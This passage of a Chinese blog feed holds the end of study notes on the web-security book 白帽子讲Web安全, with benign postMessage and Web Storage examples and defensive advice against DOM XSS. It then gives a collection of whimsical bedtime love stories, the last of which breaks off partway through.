class="tag">&lt;<span class="name">b</span>&gt;</span>This iframe is located on dev.jquery.com<span class="tag">&lt;/<span class="name">b</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span>Send me a message!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></div><div class="line"><span class="built_in">document</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).textContent =</div><div class="line">  e.domain + <span class="string">" said: "</span> + e.data;</div><div class="line">&#125;, <span class="literal">false</span>);</div><div class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在这个例子中，发送窗口负责发送消息；而在接收窗口中，需要绑定一个message事件，监听其他窗口发来的消息。这是两个窗口之间的一个“约定”，如果没有监听这个事件，则无法接收到消息。<br>在使用postMessage()时，有两个安全问题需要注意。</p>
<p>（1）在必要时，可以在接收窗口验证 Domain，甚至验证URL，以防止来自非法页面的消息。这实际上是在代码中实现一次同源策略的验证过程。<br>（2）在本例中，接收的消息写入textContent，但在实际应用中，如果将消息写入innerHTML，甚至直接写入script中，则可能会导致DOM based XSS的产生。根据“Secure By Default”原则，在接收窗口不应该信任接收到的消息，而需要对消息进行安全检查。</p>
<p>使用postMessage，也会使XSS Payload变得更加的灵活。Gareth Heyes曾经实现过一个JavaScript运行环境的sandbox，其原理是创建一个iframe，将JavaScript限制于其中执行。但笔者经过研究发现，利用postMessage() 给父窗口发送消息，可以突破此sandbox。类似的问题可能还会存在于其他应用中。</p>
<p><hr /></p>
<h3 id="6-2-3-Web-Storage"><a href="#6-2-3-Web-Storage" class="headerlink" title="6.2.3 Web Storage"></a>6.2.3 Web Storage</h3><p>在Web Storage出现之前，Gmail的离线浏览功能是通过Google Gears实现的。但随着Google Gears的夭折，Gmail转投Web Storage的怀抱。目前Google众多的产品线比如Gmail、Google Docs等所使用的离线浏览功能，都使用了Web Storage。</p>
<p>过去在浏览器里能够存储信息的方法有以下几种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Cookie</div><div class="line">Flash Shared Object</div><div class="line">IE UserData</div></pre></td></tr></table></figure>
<p>其中，Cookie主要用于保存登录凭证和少量信息，其最大长度的限制决定了不可能在Cookie中存储太多信息。而Flash Shared Object和IE UserData则是Adobe与微软自己的功能，并未成为一个通用化的标准。因此W3C委员会希望能在客户端有一个较为强大和方便的本地存储功能，这就是Web Storage。</p>
<p><code>Web Storage</code>分为<code>Session Storage</code> 和 Local Storage。Session Storage关闭浏览器就会失效，而Local Storage则会一直存在。Web Storage就像一个非关系型数据库，由Key-Value对组成，可以通过JavaScript对其进行操作。目前Firefox 3和IE 8都实现了Web Storage。使用方法如下：<br>设置一个值：<code>window.sessionStorage.setItem(key, value)</code>;<br>读取一个值：<code>window.sessionStorage.getItem(key)</code>;<br>此外，Firefox还单独实现了一个globalStorage，它是基于SQLite实现的。</p>
<p><code>window.globalStorage.namedItem(domain).setItem(key, value);</code></p>
<p>下面这个例子展示了Web Storage的使用。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"sessionStorage_show"</span>&gt;</span></div><div class="line">  sessionStorage Value:</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"localStorage_show"</span>&gt;</span></div><div class="line">  localStorage Value:</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"set"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"check"</span> <span class="attr">onclick</span>=<span class="string">"set();"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="built_in">window</span>.sessionStorage.setItem(<span class="string">"test"</span>, <span class="string">"this is sessionStorage"</span>);</div><div class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.globalStorage)&#123;</div><div class="line">    <span class="built_in">window</span>.globalStorage.namedItem(<span class="string">"a.com"</span>).setItem(<span class="string">"test"</span>, <span class="string">"this is LocalStorage"</span>);</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="built_in">window</span>.localStorage.setItem(<span class="string">"test"</span>, <span class="string">"this is LocalStorage"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"sessionStorage_show"</span>).innerHTML +=</div><div class="line">  <span class="built_in">window</span>.sessionStorage.getItem(<span class="string">"test"</span>);</div><div class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.globalStorage)&#123;</div><div class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"localStorage_show"</span>).innerHTML +=</div><div class="line">    <span class="built_in">window</span>.globalStorage.namedItem(<span class="string">"a.com"</span>).getItem(<span class="string">"test"</span>);</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"localStorage_show"</span>).innerHTML +=</div><div class="line">    <span class="built_in">window</span>.localStorage.getItem(<span class="string">"test"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">set();</div><div class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>Web Storage也受到同源策略的约束，每个域所拥有的信息只会保存在自己的域下</p>
<p>Web Storage让Web开发更加的灵活多变，它的强大功能也为XSS Payload大开方便之门。攻击者有可能将恶意代码保存在Web Storage中，从而实现跨页面攻击。<br>当Web Storage中保存有敏感信息时，也可能会成为攻击的目标，而XSS攻击可以完成这一过程。<br>可以预见，Web Storage会被越来越多的开发者所接受，与此同时，也将带来越来越多的安全挑战。</p>
<hr />
</script></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;白帽子讲Web安全&quot;&gt;&lt;a href=&quot;#白帽子讲Web安全&quot; class=&quot;headerlink&quot; title=&quot;白帽子讲Web安全&quot;&gt;&lt;/a&gt;白帽子讲Web安全&lt;/h3&gt;&lt;p&gt;吴翰清&lt;/p&gt;
&lt;hr&gt;

&lt;h3 id=&quot;1-5-安全三要素&quot;&gt;&lt;a href=&quot;
    
    </summary>
    
      <category term="web" scheme="http://www.wanglinzhizhi.me/categories/web/"/>
    
    
      <category term="移动web" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8web/"/>
    
      <category term="程序员的浪漫" scheme="http://www.wanglinzhizhi.me/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    
      <category term="web安全" scheme="http://www.wanglinzhizhi.me/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="黑客" scheme="http://www.wanglinzhizhi.me/tags/%E9%BB%91%E5%AE%A2/"/>
    
      <category term="漏洞" scheme="http://www.wanglinzhizhi.me/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="注入" scheme="http://www.wanglinzhizhi.me/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>睡前小故事</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/睡前故事/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="睡前小故事"><a href="#睡前小故事" class="headerlink" title="睡前小故事"></a>睡前小故事</h2><p><strong>狂奔的小军</strong>，讲故事的人/互联网筑基阶段/乐观的单身狗</p>
<blockquote>
<p>童话，应该是平凡生活中的梦想。而晚安，是宁静夜晚里最温柔的力量。所以，晚安小故事，就成了平凡夜晚里最温柔的梦。</p>
<p>一点点光明和一点点温度，是我能够给你的一切。</p>
<p>这世间，一切曾我们称之为童话的东西，原本都源自于人类对生活的渴望，那种渴望被剔除了杂质，然后在历史的长河中被口耳相传，把它种植在心中。</p>
<p>在我心中的那个东西，被剥离了文字和语言，然后我发现了一点闪闪发亮的小东西。我才明白所有的一切都是因它而起。</p>
<p>人类世界所有的美好和痛苦，所有的成就和灾难，生命和生活的意义。</p>
<p>它叫做，爱。</p>
<p>重要的不是童话，而是爱。</p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li>第零篇《序1：我曾经路过你，我的全世界》</li>
</ul>
<p>我用我的一半，换你为我欢笑一天。</p>
<p>你用你的一半，换我为你守护十年。</p>
</blockquote>
<ul>
<li><p>第零篇《序2：只因为看了你一眼，便万劫不复》</p>
<blockquote>
<p>我有一支笔，可以编造世间所有的美梦。</p>
<p>我用这支笔写下了这些话。</p>
<p>把你写进故事里。</p>
<p>我怕你只是一场美梦。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第一篇《零度的怀抱》</p>
<blockquote>
<p>如果你说，我对你的好，是我给你的，微不足道的，零度的温暖。那我也要感谢你，给了我一颗，懂得了疼痛的心。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第二篇《只想做你的恶魔》</p>
<blockquote>
<p>恶魔害怕自己的丑陋会吓到公主，所以他只会在公主去花园玩的时候，才敢悄悄的飞在高空中偷看她。城堡里有一个大大的花园，里面开满了九千九百九十九朵玫瑰，笨笨的恶魔为了种这些玫瑰，手掌上扎满了小刺。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第三篇《见习死神/如果明天我将离去》</p>
<blockquote>
<p> 来到这个世上，遇见那么多人，经历那么多事，成长，蜕变，痛苦，更多的是快乐。你的生命，你想要怎样的对待。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第四篇《晚安，小鸭子》</p>
<blockquote>
<p> 如果你玩累了，就醒过来吧。无论梦里或者现实，我都会在你身边。不管有没有那道门。——小狐狸</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第五篇《亿万星辰》</p>
<blockquote>
<p> 如果我们在两颗星球上，对望一眼，要花很多年。也许当我看到你的时候，你早已经成为了尘埃。亿万颗星辰，两百亿光年。这是一个巨大的迷宫。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第六篇《会飞的草帽》</p>
<blockquote>
<p>决定我们是否能够到达远方的，不是因为我们有什么样的能力，而是因为我们有一颗怎样的心。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第七篇《等不到的流星》</p>
<blockquote>
<p> 漫天璀璨的繁星，像是一块深蓝色的画布上，点缀着数不清的钻石，宁静的月光洒在脸上，心也变得很安静，周围环绕着不知名的虫鸣。小披风忽然发现，身边的小蝴蝶忽闪着的大眼睛比星星还漂亮，干净，清澈，因期待而带着些许的光芒。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第八篇《最珍贵的眼泪》</p>
<blockquote>
<p>最珍贵的眼泪，不是能化作钻石的眼泪，而是不会落下的眼泪，因为珍惜你的人，不会让你哭。</p>
<p>我没法承诺能给你太多的东西，因为未来不确定，因为我们不确定。</p>
<p>但我会告诉你，我不许你哭。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第九篇《你不要融化，我会陪你看一百万次日出》</p>
<blockquote>
<p>就算你的世界里全是暴风雪，我也会微笑着陪你。</p>
<p>我不离开。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>第十篇《月亮之子/我想温暖这个有你的世界》</p>
<blockquote>
<p>我想温暖你，也想温暖这个有你的世界。</p>
</blockquote>
</li>
</ul>
<ul>
<li>第十一篇《七秒钟的鱼》</li>
</ul>
<ul>
<li><p>第十二篇《你的梦想在远方，我的梦想在天上》</p>
<blockquote>
<p>你是流浪的旅人，我是永生不息的树。我日日夜夜的朝天生长，只为了让远方的你，能够看到天上的我。 因为你的梦想在远方，我的梦想在天上。</p>
</blockquote>
</li>
</ul>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：-零度的怀抱"><a href="#晚安小故事之：-零度的怀抱" class="headerlink" title="晚安小故事之： 零度的怀抱"></a>晚安小故事之： 零度的怀抱</h3></blockquote>
<p>小刺猬很寂寞，虽然她有一大群朋友。</p>
<p>其实，平时大家很喜欢她，很善良很热心，可是刺猬身上有着一层厚厚的刺，使得周围人和她在一起时总是要小心翼翼避免受到伤害。</p>
<p>冬季渐渐来临，空气变得很冷，小刺猬贪恋和大家在一起的感觉，每天玩得很晚，不想回家，也忘了妈妈说过的关于冬眠的话。</p>
<p>有一天，天空忽然下了大雪，大雪覆盖了回家的路，小刺猬回不了家了。她害怕的躲在大树后面。看着渐渐降临的夜幕，开始胡思乱想。</p>
<p>这时候一个雪人问她，你迷路了吗？小刺猬说，我很害怕，很困。雪人说，那你在我怀里睡一觉吧。</p>
<p>她问，你不怕我伤害你吗</p>
<p>他说，没关系，我是雪人，冰雪做的心，不懂得疼痛。</p>
<p>小刺猬看了看周围的漆黑，就像一只野兽张着大嘴，更加害怕。</p>
<p>于是她扑进了雪人怀里。</p>
<p>雪人的身体里始终保持着零度，零度并不是很低的温度，因为外面的温度已经降到零下十几度了。</p>
<p>小刺猬带着困意问雪人，呵呵你是第一个不怕被我伤害的朋友，真的很开心，但是我好困啊，我要睡觉了。明天……明天你能陪我玩吗</p>
<p>雪人淡定地骗她说，当然了。睡吧小家伙。我们明天见。</p>
<p>蒽，明天见！<br>嗯，明天见。</p>
<p>大雪封住了整个森林，漫长的冬季里，冰天雪地，北风呼啸。</p>
<p>而小刺猬在雪人的怀里睡得很甜美。</p>
<p>她梦见第二天早上，她和雪人一起看日出。<br>。。。<br>。。。<br>。。。</p>
<p>第二年，万物复苏的美好春天终于回来了。</p>
<p>小刺猬在一阵悦耳的鸟叫声中迷迷糊糊的睁开了双眼，她发现雪人的帽子正盖在自己的身上。<br>而雪人，早已经离开了。</p>
<p>雪人的心，是冰雪做的。冰雪的心，不是不懂得疼痛，而是不在乎疼痛，因为你，比疼痛更重要。</p>
<p>我不能给你更多的温暖，但是我可以驱散寒冷。</p>
<p>我们回到那个离别的早晨。</p>
<p>春天是在前一天的夜晚悄悄来临的。于是在第一天的早上，温暖的阳光打在了雪人的脸上，雪人开始变小，满脸的水痕。</p>
<p>他无奈的看着怀里的小刺猬。</p>
<p>笨蛋，我骗了你啊。</p>
<p>如果你说，我对你的好，是我给你的，微不足道的，零度的温暖。</p>
<p>那我也要感谢你，给了我一颗，懂得了疼痛的心。</p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：只想做你的恶魔"><a href="#晚安小故事之：只想做你的恶魔" class="headerlink" title="晚安小故事之：只想做你的恶魔"></a>晚安小故事之：只想做你的恶魔</h3></blockquote>
<p>很久很久以前，美丽的公主被善良的恶魔带走，关在美丽的城堡里。</p>
<p>消息传出后，邪恶的白马王子们争先恐后的出发，发誓要打败恶魔，抢回公主。<br>他们有的迷路了，有的被野兽吃了，有的救错了人。后来王子们统一了口径，回到自己的王国里宣称：公主已经被恶魔吃掉了。</p>
<p>人们都很伤心，纷纷咒骂恶魔。然而，再也没有人敢去寻找公主了。</p>
<p>而公主，被恶魔施了魔法，永远不会变老，也不会生病。</p>
<p>恶魔害怕自己的丑陋会吓到公主，所以他只会在公主去花园玩的时候，才敢悄悄的飞在高空中偷看她。城堡里有一个大大的花园，里面开满了九千九百九十九朵玫瑰，笨笨的恶魔为了种这些玫瑰，手掌上扎满了小刺。</p>
<p>恶魔每天晚上会蹲在公主的窗户陪她聊天，给她讲故事哄她睡觉。但是她从来没见过他。她知道窗外有个人在守护他，所以睡得很安稳。</p>
<p>她问恶魔，你怎么总是陪着我，你从来不回家吗？</p>
<p>恶魔回答，离开了这里，我不知道哪里是家。</p>
<p>就这样一直过去了很多年。人们忘记了公主，也忘记了恶魔。</p>
<p>忽然有一天，城堡随着狂风消失了，仿佛一切都没有发生过。</p>
<p>我们常常听到的结局是：王子与公主过上了没羞没臊的生活。<br>可是我，真的只想做那个恶魔，守护你霸占你一生，没人可以抢走你。<br>直到有一天，王子老了，白马死了，宝剑锈了，誓言枯萎了，魔法消失了，我会对白发苍苍的你说，亲爱的，陪我下地狱，好吗。</p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：见习死神-如果明天我将离去"><a href="#晚安小故事之：见习死神-如果明天我将离去" class="headerlink" title="晚安小故事之：见习死神/ 如果明天我将离去"></a>晚安小故事之：见习死神/ 如果明天我将离去</h3></blockquote>
<p>生命，是我们来到这个世界上之后，唯一平等的东西。</p>
<p>而死亡，是这世界上最伟大的冒险。</p>
<p>曾经流传着这样的一个故事，当你生命快要结束的时候，会有一位死神专门来到你面前，他的任务是要设法让你接受“自己即将死去”这件事，然后带着你离开，到底会去哪里，谁也不知道。</p>
<p>当然，这个传言无从考证，按道理说，见过死神的人都应该已经跟着他们离开了。</p>
<p>小百合生活在混凝土森林里，每天过着单调麻木的生活。每天早上她一出门，熙熙攘攘的人群就会像海浪一样把她包裹住，直到庸庸碌碌的一天结束。她不知道自己是为了什么而活着。</p>
<p>一个晴朗的早上，小百合推开窗户。阳光异常的明媚。<br>这时，她发现窗台上蹲着一个小男孩。<br>她十分惊讶：“你是谁啊？”</p>
<p>小男孩平静的回答说：“你好，小百灵，我是你的死神。”</p>
<p>“死神！？”小百合感到一阵晕眩，然后紧张的喊道“可是……等等！我不叫小百灵！我叫小百合啊！”</p>
<p>“是吗！？”小男孩瞬间变得比她还要紧张，手忙脚乱的拿出一个笔记本，开始乱翻……“哦对不起！对不起！我念错了，咳咳咳……我们……我们重新再来一遍好吗？”</p>
<p>“……啊？”小百合迷糊了。。。。</p>
<p>没等她同意，小男孩就跳到窗外，站在半空中，然后把窗户小心翼翼的关闭，在玻璃外面朝小百合打着手势，貌似是想让她打开窗户。</p>
<p>小百合无奈的打开窗户，小男孩立刻飞到窗台上，摆出和刚才一样帅的造型，蹲在小百合的面前。一脸期待的望着她。</p>
<p>然后。</p>
<p>一片安静。</p>
<p>两个人。</p>
<p>大眼瞪小眼。</p>
<p>半个小时过去了。</p>
<p>小男孩终于忍不住了，他弱弱的问道：“你……你难道不应该问我是谁吗？”</p>
<p>“你爱说不说！”小百合板着脸回答。</p>
<p>小男孩尴尬的跳进屋子里，双手捧着着笔记本，一本正经的对她说：“你好，小百合，我是你的死神，见习死神，如果今天可以完成任务通过考核，我就会正式成为死神。谢谢合作！”</p>
<p>“怎么可能！你是说我快要死了吗！！”</p>
<p>小男孩挠了挠头，“额，按道理说，应该是这样，但是也不一定，所以他们才派我来。”</p>
<p>“我还有多久时间？”</p>
<p>“你还有一天时间。有什么没有完成的心愿，你都可以赶快完成，生命很珍贵，不要留下遗憾。”</p>
<p>有什么心愿？小百合想来想去，突然想起来小时候常常去奶奶家门前的小河边钓鱼，长大后，她已经很久没有去钓鱼了。她忽然好想钓鱼。于是她决定用最后的一天时间来钓鱼，把它作为自己最后的一段美好的回忆。</p>
<p>见习死神陪小百合在郊外待了整整一天，他们钓了一大桶鱼。</p>
<p>夜色降临，小百合对见习死神说：“谢谢你满足了我最后的一个心愿，我们走吧”</p>
<p>见习死神摇摇头说：“先不急，你还有什么心愿吗？一起完成了吧。”</p>
<p>她想了想：“我想把这些鱼煮给你吃，作为对你的感谢！”</p>
<p>见习死神高兴的说：“好啊！不过今天时间不早了，早点休息。你明天煮给我吃吧！”</p>
<p>不等小百合反应过来，见习死神就飞走了。</p>
<p>第二天的早晨，依然很晴朗。小百合一起床就去打开窗户，见习死神迫不及待的跳进来，嚷着要吃鱼，并且说吃完鱼就带她走。</p>
<p>小百合其实有着很好的厨艺，只不过平时太忙碌，也没有兴趣好好地做一顿饭。</p>
<p>她心想，既然这是最后一次做饭了，那就好好地为自己做一顿大餐，作为最后的晚宴。这样也就没什么遗憾了。</p>
<p>一整个白天，她都在做着各式各样的菜肴，当然，主要的大菜还是鱼，红烧鱼，清蒸鱼，糖醋鱼。。。。</p>
<p>晚饭的时候，见习死神可谓是大饱口福。临走时还两只手各拎了一条鱼，说是要给前辈们常常。</p>
<p>“你看我两只手都拎着鱼，没法带你走。要不，明天我再来找你吧”见习死神打着嗝，晃晃悠悠的飞走了。</p>
<p>小百合很无语的看着他的背影。</p>
<p>当天夜里下了大雨。温度骤降。</p>
<p>第三天早上，小百合打开窗户的时候，一个湿淋淋的人影迅速冲进来，她仔细一看，原来是被大雨淋成了落汤鸡的见习死神阁下。</p>
<p>见习死神惨白的脸打着哆嗦说到：“快……给我拿一杯热水！阿嚏！”</p>
<p>小百合拿来热水和体温计，发现他发了高烧，烧得满嘴胡话，小百合喂他吃了药，并且照顾了他一整天。她从来不知道原来自己也懂得照顾人，而且可以照顾得这么好。</p>
<p>傍晚时，见习死神已经好的差不多了。</p>
<p>小百合告诉他，郊外的山上有一种草，治伤寒感冒特别好，如果有那种药，他的病会好得更快。</p>
<p>见习死神连忙说：“那我明天再带你走！你明天帮我熬那种药好吗？我最讨厌生病了！”</p>
<p>“好吧……明天见，见习死神O(∩_∩)O！”</p>
<p>就这样，一天天过去了，每天傍晚，小百合都会找到下一件需要去做的事，而死神呢，也会一次次的延长她的寿命，每一次都只是延长一天。她发现自己的生命不但没有缩短和消失，反而变得充实起来。</p>
<p>见习死神，一直没有成为真正的死神，因为他的任务，始终没有完成。</p>
<p>直到有一天，见习死神没有出现在小百合的窗台。</p>
<p>后来，他再也没有出现。</p>
<p>我为了什么而活着？我们常常问自己。<br>答案很多。<br>为了父母，为了亲人，为了朋友，为了爱情，为了实现理想，为了履行使命。<br>来到这个世上，遇见那么多人，经历那么多事，成长，蜕变，痛苦，更多的是快乐。你的生命，你想要怎样的对待。</p>
<p>如果明天我将离去，我还有什么事要做？</p>
<p>未来足够你爱。</p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：晚安，小鸭子"><a href="#晚安小故事之：晚安，小鸭子" class="headerlink" title="晚安小故事之：晚安，小鸭子"></a>晚安小故事之：晚安，小鸭子</h3></blockquote>
<p>从前，有一只小鸭子。<br>她特别喜欢胡思乱想，每天乱跑，不听话。<br>可是她特别可爱，所有人都喜欢她。</p>
<p>有一天，她的妈妈要出门了。鸭妈妈出门前，嘱咐她说：“宝贝，你要好好的呆在家里，不要乱跑。不要让外面的坏人进来抓走你！”小鸭子点点头。<br>但是妈妈出门没多久，小鸭子就奈不住寂寞了。<br>她趴在窗台向外看去，远处的树林里，有好多蝴蝶在飞舞，树林的尽头有一条小河，小鸭子仿佛能听到潺潺的流水声。<br>天空中飞过几只老鹰，老鹰盘旋着，从一片云的下面飞到另一片云的下面。</p>
<p>忽然，门外传来了一阵讨厌的敲门声，打断了小鸭子的思绪。<br>“梆梆梆！”<br>小鸭子问，你是谁啊？<br>门外传来一个声音，小鸭子在家吗，我是你的妈妈，快开门啊。<br>小鸭子说，你是狐狸，是坏人，我不给你开门。<br>小狐狸急忙解释，好吧，我确实是小狐狸，可我真的不是坏人，我是来找你玩的，你出来吧，我们一起去森林玩。<br>小鸭子摇摇头，任凭小狐狸磨破了嘴皮子，就是不给他开门。</p>
<p>天黑了，妈妈还是没有回来。<br>小鸭子又饿又困。<br>小狐狸还是不死心，就跑到河边抓了好多小鱼，塞进了小鸭子家的门缝里，想讨好小鸭子。<br>小鸭子也不客气，三下五除二的把那些小鱼都吞了。小鸭子每次吃完东西，就会犯困。于是她也不顾门外可怜巴巴的小狐狸，自顾自的趴在椅子上睡了。</p>
<p>一觉醒来，小鸭子发现自己躺在一朵云彩上，自己竟然变成了一只天鹅，<br>身上长满洁白羽毛的天鹅。她张开宽大强健的翅膀，振翅翱翔，飞过森林，飞过小河，飞向远处的彩虹。<br>她飞得特别开心，大笑起来。<br>正在这时，一阵狂风把她刮了下来，她掉在一棵大树上，一棵好大好大的树，树叶是粉红的，树枝上挂着长满了巧克力和冰激凌。她惊讶的发现自己又变成了一只猴子，她也懒得去想这是怎么回事，流着口水开始摘巧克力，摘冰激凌，然后不停的往嘴里送。</p>
<p>正当她吃得过瘾，忽然又听到了一阵敲门声。<br>“梆梆梆！”<br>“小鸭子，小鸭子，你吃完鱼了吗？”那只小狐狸还没有放弃。。。<br>小鸭子想起那些巧克力和冰激凌，恼火的说，你快走吧，我不会跟你玩的。真讨厌。打扰我睡觉！<br>小狐狸说，那你继续睡觉吧。我会在门外等着你睡醒。晚安，小鸭子。</p>
<p>小鸭子继续睡觉。<br>天亮的时候，鸭妈妈回来了，小鸭子打开门时，发现门上贴着一张纸，上面写着：<br>“晚安，小鸭子。”<br>小鸭子四下张望，并没有看到小狐狸的影子。于是问妈妈有没有看到一只小狐狸，妈妈说有啊有啊，那只小狐狸一看到我来，立马吓跑了！</p>
<p>小鸭子哈哈大笑。<br>她笑着笑着就笑醒了。</p>
<p>男孩问她，你在笑什么啊大半夜的。<br>她停下了笑声，迷茫的问男孩，我在哪里？</p>
<p>男孩敲了一下她的额头，睡糊涂了吗！<br>——我刚才梦见自己是一只小鸭子，然后是天鹅，再然后是猴子，再然后又是小鸭子，对了，我还被一只莫名其妙的小狐狸骚扰了一整个晚上。<br>——后来呢？<br>——后来……后来那只倒霉的小狐狸走了。哈哈哈，真奇怪，他好像真的是来找我玩的……</p>
<p>男孩抱着她说，别多想了，睡吧。<br>嗯。。。晚安<br>晚安，小鸭子。</p>
<p>男孩温柔地在她耳边说道。</p>
<p>小鸭子，小鸭子，你到底开不开门啊。我真的是来你玩的。你现在不想出来玩没关系，我慢慢等你。我会喂饱你，等你睡醒了再出来陪我玩。没事，我不急。我唯一怕的就是遇到你的妈妈，她一定会以为我想伤害你。嘿嘿。</p>
<blockquote>
<p>  如果你玩累了，就醒过来吧。无论梦里或者现实，我都会在你身边。不管有没有那道门.</p>
<p>  ————小狐狸</p>
</blockquote>
<p>【晚安】</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之-亿万星辰-我在时间的尽头等你"><a href="#晚安小故事之-亿万星辰-我在时间的尽头等你" class="headerlink" title="晚安小故事之:亿万星辰/我在时间的尽头等你"></a>晚安小故事之:亿万星辰/我在时间的尽头等你</h3></blockquote>
<p>我们的宇宙。</p>
<p>时间，空间，物质，能量。</p>
<p>它神秘，亲切，难以捉摸，充满诱惑。</p>
<p>一百五十亿年以前，很小的一个点，无限质量，无限密度，绝对高温。它爆炸了，空间由此诞生，时间也从那一刻开始有了意义。</p>
<p>爆炸后的一秒内，温度从几十万亿度降低到100亿度，宇宙中出现了很多基本粒子。</p>
<p>三分钟后，温度已经降低到了十亿度。</p>
<p>又过了几十亿年，一些像模像样的星球开始出现。</p>
<p>宇宙变得很寒冷，很黑暗。</p>
<p>大概一百亿年左右的时候，太阳诞生了。太阳系逐渐成型。</p>
<p>38亿年前，地球上出现了生命。</p>
<p>后来，有了我们。</p>
<p>我和你。</p>
<p>你说，这是多么漫长的旅程。</p>
<p>银河系里有2500亿颗太阳，而银河系这样平凡的星系，在宇宙中起码有十亿个。</p>
<p>如果我们在两颗星球上，对望一眼，要花很多年。</p>
<p>也许当我看到你的时候，你早已经成为了尘埃。</p>
<p>亿万颗星辰，两百亿光年。这是一个巨大的迷宫。</p>
<p>多么奇妙的捉迷藏。</p>
<p>我们会相遇吗。</p>
<p>我们在遇到彼此之前，还要等多久。</p>
<p>我会用尽全部的力气，在亿万颗星辰之中，一颗一颗的寻找你的身影。</p>
<p>我甘愿在这个零下两百七十度的寒冷宇宙中，用剩下的几百亿年的时间，等你。直到宇宙重新坍缩成那个没有意义的点。</p>
<p>如果我没有遇见你。</p>
<p>如果我不会遇见你。</p>
<p>穷尽这个宇宙的一生。</p>
<p>我会在时间的尽头，等你。</p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：会飞的草帽"><a href="#晚安小故事之：会飞的草帽" class="headerlink" title="晚安小故事之：会飞的草帽"></a>晚安小故事之：会飞的草帽</h3></blockquote>
<p>在一个卖草帽的店铺里，挂着一排排一模一样的草帽。<br>圆顶，大帽檐。<br>结实，轻巧。<br>金黄色的麦秆编织而成的草帽，散发着泥土和麦子的香味。<br>在烈日骄阳下赶路的旅人很喜欢这样的帽子，所以这家店铺的草帽生意一直不错。</p>
<h5 id="1"><a href="#1" class="headerlink" title="$1"></a>$1</h5><p>一天早上，一个年轻的流浪汉走进店铺。他的衣服上打了很多补丁，但是很干净，他似乎很疲惫，脸上却带着笑容。</p>
<p>老板问他，年轻人，你想要买一顶草帽吗？你可以在这些草帽中选一顶最满意的，而我一定会给你最公道的价格。</p>
<p>流浪汉看向架子上的那些草帽，一眼就相中了最右边那顶，他把那顶草帽拿在手里，越看越喜欢。可是他知道，他买不起。他只是一个向往远方的流浪者，自从离开家的那一天起，他一边打工一边旅行，已经周游了很多地方。到过的地方越多，就越想看到更多的风景。</p>
<p>他收回思绪，叹着气把草帽放回架子上，然后把系在左手腕上的红绳子绑在草帽上，微笑着向老板告别，继续他的旅行。</p>
<p>流浪汉走后没多久，一阵大风刮进店铺，把架子上的草帽全都吹到了地上，老板手忙脚乱的去拾地上的草帽，没有发现那个系着红绳子的草帽已经飞走了。</p>
<p>其实它本来就是一顶有魔力的草帽，之前一直找不到机会飞出来。现在，它终于自由了。</p>
